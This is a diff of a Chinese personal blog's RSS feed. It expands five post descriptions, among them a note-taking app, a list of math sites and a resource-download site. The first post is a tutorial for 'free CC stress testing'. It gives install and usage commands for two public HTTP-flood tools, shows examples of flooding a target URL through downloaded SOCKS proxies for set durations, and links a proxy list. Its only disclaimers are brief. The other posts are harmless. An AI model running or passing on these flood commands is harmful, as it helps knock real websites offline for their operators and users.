@@ -1,1 +1,277 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>白票 on LEl_FENG的小屋</title><link>https://blog.xpdbk.com/categories/%E7%99%BD%E5%AB%96/</link><description>Recent content in 白票 on LEl_FENG的小屋</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 10 Feb 2023 00:00:00 +0700</lastBuildDate><atom:link href="https://blog.xpdbk.com/categories/%E7%99%BD%E5%AB%96/index.xml" rel="self" type="application/rss+xml"/><item><title>如何进行免费的CC压力测试</title><link>https://blog.xpdbk.com/post/cc-gongji/</link><pubDate>Fri, 10 Feb 2023 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/cc-gongji/</guid><description>&lt;img src="https://blog.xpdbk.com/post/cc-gongji/awa.jpg" alt="Featured image of post 如何进行免费的CC压力测试" />CC压力测试教程 仅供测试不要用来做违法的事情 脚本介绍 kolbwang CC-attack（方便但是太老了） 1 2 3 pip3 install requests pysocks git clone https://github.com/kolbwang/cc-attack.git cd cc-attack 使用 1 python3 cc.py 这个脚本很老了 总</description></item><item><title>Obsidian：一款离线笔记软件</title><link>https://blog.xpdbk.com/post/obsidian-bj/</link><pubDate>Wed, 28 Dec 2022 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/obsidian-bj/</guid><description>&lt;img src="https://blog.xpdbk.com/post/obsidian-bj/1.png" alt="Featured image of post Obsidian：一款离线笔记软件" />obsidian笔记 obsidian是一种笔记软件，可在您的本地纯文本文件文件夹之上运行。 给孙子的笔记 在我们这个云服务可以随时 关闭 、被 收购或</description></item><item><title>jigou网站导航</title><link>https://blog.xpdbk.com/post/dh-jigou/</link><pubDate>Sat, 24 Dec 2022 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/dh-jigou/</guid><description>&lt;img src="https://blog.xpdbk.com/post/dh-jigou/1.png" alt="Featured image of post jigou网站导航" />jigou网站导航 一个IQ导航 站点齐全（以后的事情） 制作精美（确实doge） 在这里</description></item><item><title>数学网站</title><link>https://blog.xpdbk.com/post/shuxue-wangzhan-baipiao/</link><pubDate>Wed, 21 Dec 2022 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/shuxue-wangzhan-baipiao/</guid><description>数学网站 1.在线解高等数学题 我们知道初高中数学可以求助小猿搜题，作业帮等软件，但是高数就没那么灵了。这个网站，可以在线解各种高等数学方程式，</description></item><item><title>搭建了2个月的资源网站</title><link>https://blog.xpdbk.com/post/minecraft-ziyuan/</link><pubDate>Thu, 15 Dec 2022 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/minecraft-ziyuan/</guid><description>脱离Q群的万能资源网站 以下是我创建这个资源网站的初衷: 1.在Q群里面问文件的小白 2.我想找文件但是就没有这个文件 3.新手期的我被资源者圈了6</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>白票 on LEl_FENG的小屋</title><link>https://blog.xpdbk.com/categories/%E7%99%BD%E5%AB%96/</link><description>Recent content in 白票 on LEl_FENG的小屋</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 10 Feb 2023 00:00:00 +0700</lastBuildDate><atom:link href="https://blog.xpdbk.com/categories/%E7%99%BD%E5%AB%96/index.xml" rel="self" type="application/rss+xml"/><item><title>如何进行免费的CC压力测试</title><link>https://blog.xpdbk.com/post/cc-gongji/</link><pubDate>Fri, 10 Feb 2023 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/cc-gongji/</guid><description>&lt;img src="https://blog.xpdbk.com/post/cc-gongji/awa.jpg" alt="Featured image of post 如何进行免费的CC压力测试" />&lt;h2 id="cc压力测试教程">CC压力测试教程&lt;/h2>
+&lt;blockquote>
+&lt;p>仅供测试不要用来做违法的事情&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="脚本介绍">脚本介绍&lt;/h2>
+&lt;h3 id="kolbwangcc-attack方便但是太老了">kolbwang CC-attack（方便但是太老了）&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">pip3 install requests pysocks
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git clone https://github.com/kolbwang/cc-attack.git
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> cc-attack
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>使用&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 cc.py
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;strong>这个脚本很老了 总是会停攻击&lt;/strong>&lt;/p>
+&lt;blockquote>
+&lt;p>脚本开源库：&lt;a class="link" href="https://github.com/kolbwang/cc-attack" target="_blank" rel="noopener"
+>GitHub - kolbwang/cc-attack&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="leeon123-cc-attack">Leeon123 CC-attack&lt;/h3>
+&lt;h4 id="安装windows">安装（windows）&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">pip3 install requests pysocks
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git clone https://github.com/Leeon123/CC-attack.git
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 也可以直接下载下来&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> CC-attack
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="用法windows">用法（Windows）&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python cc.py &amp;lt;arguments&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============&lt;/span> CC-attack &lt;span class="nb">help&lt;/span> &lt;span class="nv">list&lt;/span> &lt;span class="o">===============&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -h/help &lt;span class="p">|&lt;/span> showing this message
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -url &lt;span class="p">|&lt;/span> &lt;span class="nb">set&lt;/span> target url
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -m/mode &lt;span class="p">|&lt;/span> &lt;span class="nb">set&lt;/span> program mode
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -data &lt;span class="p">|&lt;/span> &lt;span class="nb">set&lt;/span> post data path &lt;span class="o">(&lt;/span>only works on post mode&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>Example: -data data.json&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -cookies &lt;span class="p">|&lt;/span> &lt;span class="nb">set&lt;/span> cookies &lt;span class="o">(&lt;/span>Example: &lt;span class="s1">&amp;#39;id:xxx;ua:xxx&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -v &lt;span class="p">|&lt;/span> &lt;span class="nb">set&lt;/span> proxy &lt;span class="nb">type&lt;/span> &lt;span class="o">(&lt;/span>4/5/http, default:5&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -t &lt;span class="p">|&lt;/span> &lt;span class="nb">set&lt;/span> threads number &lt;span class="o">(&lt;/span>default:800&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -f &lt;span class="p">|&lt;/span> &lt;span class="nb">set&lt;/span> proxies file &lt;span class="o">(&lt;/span>default:proxy.txt&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -b &lt;span class="p">|&lt;/span> enable/disable brute mode
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> &lt;span class="nv">Enable&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="nv">Disable&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span> &lt;span class="o">(&lt;/span>default:0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -s &lt;span class="p">|&lt;/span> &lt;span class="nb">set&lt;/span> attack time&lt;span class="o">(&lt;/span>default:60&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -down &lt;span class="p">|&lt;/span> download proxies
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -check &lt;span class="p">|&lt;/span> check &lt;span class="nv">proxies&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=====================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="下载代理列表">下载代理列表&lt;/h4>
+&lt;p>将 socks5 代理下载为 proxy.txt：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python cc.py -down -f proxy.txt -v &lt;span class="m">5&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>使用自定义代理列表（socks4.txt）攻击目标 30 秒：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python cc.py -url http://target.com -f socks4.txt -v &lt;span class="m">4&lt;/span> -s &lt;span class="m">30&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="启动脚本">启动脚本&lt;/h4>
+&lt;p>新建.cmd文件&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl"># 填入下面的链接 嫌烦就去掉这个注释
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python cc.py -url https://网站.com -v 5 -s 600 # 默认是proxy.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>不要用来攻击无辜的网站！！！&lt;/p>
+&lt;blockquote>
+&lt;p>http代理下载&lt;/p>
+&lt;p>&lt;a class="link" href="https://pvphack.lanzoue.com/imPc30n8n9qf" target="_blank" rel="noopener"
+>https://pvphack.lanzoue.com/imPc30n8n9qf&lt;/a>&lt;/p>
+&lt;p>密码:6dh1&lt;/p>
+&lt;p>项目GITHUB链接&lt;/p>
+&lt;p>&lt;a class="link" href="https://github.com/Leeon123/CC-attack" target="_blank" rel="noopener"
+>GitHub - Leeon123/CC-attack: Using Socks4/5 or http proxies to make a multithreading Http-flood/Https-flood (cc) attack.&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>不要拿去违法OwO&lt;/p></description></item><item><title>Obsidian：一款离线笔记软件</title><link>https://blog.xpdbk.com/post/obsidian-bj/</link><pubDate>Wed, 28 Dec 2022 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/obsidian-bj/</guid><description>&lt;img src="https://blog.xpdbk.com/post/obsidian-bj/1.png" alt="Featured image of post Obsidian：一款离线笔记软件" />&lt;h2 id="obsidian笔记">obsidian笔记&lt;/h2>
+&lt;p>&lt;u>obsidian是一种笔记软件，可在您的本地纯文本文件文件夹之上运行。&lt;/u>&lt;/p>
+&lt;h2 id="给孙子的笔记">给孙子的笔记&lt;/h2>
+&lt;p>在我们这个云服务可以随时 &lt;a class="link" href="https://techcrunch.com/2013/07/31/evernote-competitor-catch-com-shuts-down-its-note-taking-apps-company-heading-in-different-direction/" target="_blank" rel="noopener"
+>关闭&lt;/a> &lt;a class="link" href="https://www.theverge.com/2014/5/22/5741602/one-time-evernote-pinterest-rival-springpad-to-close-its-doors" target="_blank" rel="noopener"
+>、&lt;/a>&lt;a class="link" href="https://gadgets.ndtv.com/apps/news/microsoft-to-do-new-features-wunderlist-shuts-down-2224833" target="_blank" rel="noopener"
+>被&lt;/a> &lt;a class="link" href="https://www.theverge.com/2012/3/12/2865638/twitter-acquires-posterous-blogging-platform" target="_blank" rel="noopener"
+>收购&lt;/a>或 &lt;a class="link" href="https://techcrunch.com/2016/12/14/evernotes-new-privacy-policy-allows-employees-to-read-your-notes/" target="_blank" rel="noopener"
+>更改隐私政策&lt;/a>的时代， 您最不想要的就是专有格式和数据锁定。&lt;/p>
+&lt;p>使用 Obsidian，&lt;strong>您的数据位于本地文件夹&lt;/strong>中。永远不要再将您一生的工作作为人质留在云端。&lt;/p>
+&lt;h2 id="面向未来的格式">面向未来的格式&lt;/h2>
+&lt;p>黑曜石使用 Markdown。Markdown 被 Reddit 和 GitHub 等网站广泛使用，并且不会很快消失。&lt;/p>
+&lt;p>Markdown 被设计成人类可读的。它没有被编码混淆；您可以直接使用 Markdown 编辑器编辑源文件，也可以使用脚本自动编辑它们。&lt;/p>
+&lt;h2 id="全面控制">全面控制&lt;/h2>
+&lt;p>你的笔记存在于你的设备上，期间。您可以根据需要对它们进行加密或备份；这是你的决定，不是我们的。&lt;/p>
+&lt;p>纯文本文件可让您在其上进行各种同步、加密和数据处理。Obsidian 与 Dropbox、Cryptomator 和任何处理纯文本文件的软件配合得很好。&lt;/p>
+&lt;h2 id="始终可用">始终可用&lt;/h2>
+&lt;p>没有互联网？没问题。Obsidian 完全离线工作，互联网或服务问题永远不会成为您的问题。&lt;/p>
+&lt;p>随时随地享受阅读和处理笔记的乐趣。&lt;/p>
+&lt;p>&lt;a class="link" href="https://obsidian.md/" target="_blank" rel="noopener"
+>官网&lt;/a>&lt;/p></description></item><item><title>jigou网站导航</title><link>https://blog.xpdbk.com/post/dh-jigou/</link><pubDate>Sat, 24 Dec 2022 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/dh-jigou/</guid><description>&lt;img src="https://blog.xpdbk.com/post/dh-jigou/1.png" alt="Featured image of post jigou网站导航" />&lt;h2 id="jigou网站导航">jigou网站导航&lt;/h2>
+&lt;p>一个IQ导航&lt;/p>
+&lt;p>&lt;img src="https://blog.xpdbk.com/post/dh-jigou/1.png"
+width="1366"
+height="657"
+srcset="https://blog.xpdbk.com/post/dh-jigou/1_hubdf805a06a4393d531e42cd8196c2ea8_161415_480x0_resize_box_3.png 480w, https://blog.xpdbk.com/post/dh-jigou/1_hubdf805a06a4393d531e42cd8196c2ea8_161415_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="站点演示"
+class="gallery-image"
+data-flex-grow="207"
+data-flex-basis="498px"
+>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;input checked="" disabled="" type="checkbox"> 站点齐全（以后的事情）&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;input checked="" disabled="" type="checkbox"> 制作精美（确实doge）&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>在&lt;a class="link" href="https://jigou.xpdbk.com" target="_blank" rel="noopener"
+>这里&lt;/a>&lt;/p></description></item><item><title>数学网站</title><link>https://blog.xpdbk.com/post/shuxue-wangzhan-baipiao/</link><pubDate>Wed, 21 Dec 2022 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/shuxue-wangzhan-baipiao/</guid><description>&lt;h2 id="数学网站">数学网站&lt;/h2>
+&lt;h2 id="1在线解高等数学题httpswwwmathwaycomalgebra">1.&lt;a class="link" href="https://www.mathway.com/Algebra" target="_blank" rel="noopener"
+>在线解高等数学题&lt;/a>&lt;/h2>
+&lt;p>我们知道初高中数学可以求助小猿搜题，作业帮等软件，但是高数就没那么灵了。这个网站，可以在线解各种高等数学方程式，你可以自己手动输入，也可以点击右下角的那个照相按钮上传照片。&lt;/p>
+&lt;h2 id="2计算型知识搜索引擎httpswwwwolframalphacom">2.&lt;a class="link" href="https://www.wolframalpha.com/" target="_blank" rel="noopener"
+>计算型知识搜索引擎&lt;/a>&lt;/h2>
+&lt;p>在这个网站里，你几乎可以找到任何关于数据的答案，包括复杂的数学公式、悠久的历史资料、权&lt;a class="link" href="https://pinpai.smzdm.com/6689/" target="_blank" rel="noopener"
+>威的&lt;/a>官方数据等等，只要你有什么问题，都可以这里问问。。不过只支持英文，如果你输入中文，会自动翻译成英文。&lt;/p>
+&lt;h2 id="3数学公式编辑器httpslatex91mathscom">3.&lt;a class="link" href="https://latex.91maths.com/" target="_blank" rel="noopener"
+>数学公式编辑器&lt;/a>&lt;/h2>
+&lt;p>在线【LaTex】数学公式编辑器，像拿着笔在纸上书写一样实现数学公式的在线输入。&lt;/p>
+&lt;h2 id="4photomath-拍照解数学题httpswwwphotomathneten">4.&lt;a class="link" href="https://www.photomath.net/en/" target="_blank" rel="noopener"
+>Photomath-拍照解数学题&lt;/a>&lt;/h2>
+&lt;p>一元方程、二元方程只需要扫一下就可以获取答案，使用十分的快速便捷。不过要注意的是一定要写的工整哦，练笔可是识别不出来的。右划可以看详细步骤，左划可以修改计算式。&lt;/p>
+&lt;h2 id="5math-notepadhttpsmathnotepadcom">5.&lt;a class="link" href="https://mathnotepad.com/" target="_blank" rel="noopener"
+>Math Notepad&lt;/a>&lt;/h2>
+&lt;p>Math Notepad 是一个基于在线版的数学计算编辑器工具，它专门为工程师、学生和数学工作者而设计，采用基于Web&lt;a class="link" href="https://www.smzdm.com/fenlei/bijiben/" target="_blank" rel="noopener"
+>记事本&lt;/a>的模式开发，用户可以像编辑文本一样编辑数学表达式，其结果会在表达式正下方显示。&lt;/p>
+&lt;h2 id="6数学帝国httpswwwnumberempirecom">6.&lt;a class="link" href="https://www.numberempire.com/" target="_blank" rel="noopener"
+>数学帝国&lt;/a>&lt;/h2>
+&lt;p>数字帝国(Number Empire)是一个专业的数学&lt;a class="link" href="https://www.smzdm.com/fenlei/jisuanqi/" target="_blank" rel="noopener"
+>计算器&lt;/a>工具，目前提供了多大28种与数学有关的计算器，对于数学计算工作者非常有用，该网站可以说是人人共享的强大的数学工具。 支持以下这么多种计算。&lt;/p>
+&lt;h2 id="7geogebra-数学应用httpswwwgeogebraorg">7. &lt;a class="link" href="https://www.geogebra.org/" target="_blank" rel="noopener"
+>GeoGebra 数学应用&lt;/a>&lt;/h2>
+&lt;p>GeoGebra是一款让学生爱上数学的免费中文互动教学工具，可以制作出让学生与老师互动的线上数学教案，学生可以看到并且可以摸到数学，实际操作物件，来体验数学换算出来的实际数字或图形结果。&lt;/p>
+&lt;h2 id="8copycharhttpscopycharccmath">8.&lt;a class="link" href="https://copychar.cc/math/" target="_blank" rel="noopener"
+>copychar&lt;/a>&lt;/h2>
+&lt;p>“Copy Char”是一个可以帮助读者快速浏览、找寻自己需要的特殊符号，点击后快速复制到剪切板上使用，目前该网站收录的特殊符号包括字母、标点符号、数学、数字、货币、符号、箭头和表情等。&lt;/p>
+&lt;h2 id="9微软数学httpsgosmzdmcoma0327b8e62c287a3ca_bb_yc_5375_70690850_10064_0_5382_0">9.&lt;a class="link" href="https://go.smzdm.com/a0327b8e62c287a3/ca_bb_yc_5375_70690850_10064_0_5382_0" target="_blank" rel="noopener"
+>微软数学&lt;/a>&lt;/h2>
+&lt;p>从小学，初中到高中的数学题，拍照解题、多种做题方法、函数图表、练习题，学生党必备&lt;/p>
+&lt;p>&lt;a class="link" href="https://pinpai.smzdm.com/1461/" target="_blank" rel="noopener"
+>微软&lt;/a>数学它能够解答从小学、初中到高中各个级别和类型的数学题，通过手写输入题目（支持 Apple Pencil）、拍照识别题目，获得多种方法的解题步骤以及解题答案。&lt;/p>
+&lt;h2 id="10mathtype-69---最好用的数学公式编辑器httpsgosmzdmcom94313cd7a520001eca_bb_yc_5375_70690850_10064_0_5382_0">10.&lt;a class="link" href="https://go.smzdm.com/94313cd7a520001e/ca_bb_yc_5375_70690850_10064_0_5382_0" target="_blank" rel="noopener"
+>MathType 6.9 - 最好用的数学公式编辑器&lt;/a>&lt;/h2>
+&lt;p>MathType 是一个功能强大、所见即所得的数学公式编辑器，可以在 Word、PowerPoint 等&lt;a class="link" href="https://www.smzdm.com/fenlei/bangongruanjian/" target="_blank" rel="noopener"
+>办公软件&lt;/a>中轻松输入各种复杂的物理公式、化学方程式和符号。&lt;/p>
+&lt;p>由 MathType 创建的公式能与 Office 文档完美结合，显示效果很好；MathType可在任何支持 OLE 对象嵌入的软件中调用，可为网页、桌面出版、数学试卷、演示程序、E-learning 等文档或平台创建公式符号。&lt;/p>
+&lt;p>现在 MathType 已支持 TeX、LaTeX 以及数学标记语言 MathML，可在 MathType中直接输入 LaTeX，制作的公式可以导出为 PostScript EPS 文档、图元文件 WMF 或 GIF 格式。&lt;/p>
+&lt;h2 id="11mathcha--支持手写识别公式的在线数学编辑器不会-latex-也能用httpswwwmathchaio">11.&lt;a class="link" href="https://www.mathcha.io/" target="_blank" rel="noopener"
+>Mathcha -支持手写识别公式的在线数学编辑器，不会 LaTeX 也能用&lt;/a>&lt;/h2>
+&lt;p>Mathcha 是一款所见即所得（WYSIWYG）的在线数学编辑器，拥有免费的在线版本以及可离线使用的付费客户端，可以让你在不会 LaTeX 语法的情况下，也能使用 LaTeX 强大的公式、布局、排版功能，支持识别手写公式。&lt;/p>
+&lt;h1 id="heading">&lt;/h1></description></item><item><title>搭建了2个月的资源网站</title><link>https://blog.xpdbk.com/post/minecraft-ziyuan/</link><pubDate>Thu, 15 Dec 2022 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/minecraft-ziyuan/</guid><description>&lt;h2 id="脱离q群的万能资源网站">脱离Q群的万能资源网站&lt;/h2>
+&lt;p>&lt;img src="https://blog.xpdbk.com/post/minecraft-ziyuan/bg.png"
+width="1366"
+height="657"
+srcset="https://blog.xpdbk.com/post/minecraft-ziyuan/bg_huc283c3657c17b25b90026acab70a601d_18176_480x0_resize_box_3.png 480w, https://blog.xpdbk.com/post/minecraft-ziyuan/bg_huc283c3657c17b25b90026acab70a601d_18176_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="站点图片"
+class="gallery-image"
+data-flex-grow="207"
+data-flex-basis="498px"
+>&lt;/p>
+&lt;h2 id="以下是我创建这个资源网站的初衷">以下是我创建这个资源网站的初衷:&lt;/h2>
+&lt;p>1.在Q群里面问文件的小白&lt;/p>
+&lt;p>2.我想找文件但是就没有这个文件&lt;/p>
+&lt;p>3.新手期的我被资源者圈了60r&lt;/p>
+&lt;p>4.帮助新手方便下载资源&lt;/p>
+&lt;p>5.避免一些潜在病毒&lt;/p>
+&lt;p>6.圈钱狗死内&lt;/p>
+&lt;h3 id="由于不能捐赠所以网站的硬件不好能用就行">由于不能捐赠所以网站的硬件不好（能用就行）&lt;/h3>
+&lt;p>&lt;img src="https://blog.xpdbk.com/post/minecraft-ziyuan/vps.png"
+width="1202"
+height="743"
+srcset="https://blog.xpdbk.com/post/minecraft-ziyuan/vps_hu28fc7e88f5f30f65dcac58a3ed1720fa_12067_480x0_resize_box_3.png 480w, https://blog.xpdbk.com/post/minecraft-ziyuan/vps_hu28fc7e88f5f30f65dcac58a3ed1720fa_12067_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="我的服务器"
+class="gallery-image"
+data-flex-grow="161"
+data-flex-basis="388px"
+>&lt;/p>
+&lt;h3 id="更新log">更新log：&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;input disabled="" type="checkbox"> 持续增加网盘（快期中了没时间折腾了）&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;input checked="" disabled="" type="checkbox"> 超简单的分类（迫真）&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;input disabled="" type="checkbox"> 没病毒（请在虚拟机里面运行，锁机了别来找我）&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;input checked="" disabled="" type="checkbox"> 火绒检测71个恶意病毒全部消灭&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;input checked="" disabled="" type="checkbox"> 免费（不接受捐赠）&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;input disabled="" type="checkbox"> 好的线路（rn服务器）&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;input disabled="" type="checkbox"> 搜索可用&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;input checked="" disabled="" type="checkbox"> 抗CC DDOS攻击（某些人急了会来刷我CDN流量的）&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;a class="link" href="https://drive.xpdbk.com/" target="_blank" rel="noopener"
+>资源网站&lt;/a>&lt;/p></description></item></channel></rss>
